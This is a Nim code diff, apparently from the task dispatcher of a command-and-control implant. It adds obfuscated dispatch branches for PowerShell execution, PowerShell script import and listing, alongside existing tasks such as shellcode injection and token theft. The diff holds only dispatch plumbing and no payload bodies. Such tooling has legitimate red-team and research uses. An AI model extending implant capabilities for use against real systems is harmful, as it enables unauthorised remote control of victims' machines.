@@ -48,6 +48,9 @@ when defined(windows):
   import ../tasks/execute_assembly
   import ../tasks/inline_execute
   import ../tasks/powerpick
+  import ../tasks/powershell
+  import ../tasks/powershell_import
+  import ../tasks/powershell_list
   import ../tasks/shinject
   import ../tasks/make_token
   import ../tasks/steal_token
@@ -252,6 +255,44 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("completed"): true,
           obf("status"): "error",
           obf("user_output"): obf("powerpick command is only available on Windows")
+        }
+    
+    of obf("powershell"):
+      when defined(windows):
+        debug "[DEBUG] Executing powershell command"
+        result.response = powershell(taskId, params)
+        result.response[obf("task_id")] = %taskId
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("powershell command is only available on Windows")
+        }
+    
+    of obf("powershell_import"):
+      when defined(windows):
+        debug "[DEBUG] Starting powershell_import (file download)"
+        result.response = executePowershellImport(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("powershell_import command is only available on Windows")
+        }
+    
+    of obf("powershell_list"):
+      when defined(windows):
+        debug "[DEBUG] Executing powershell_list command"
+        result.response = powershellList(taskId, params)
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("powershell_list command is only available on Windows")
         }
     
     of obf("whoami"):
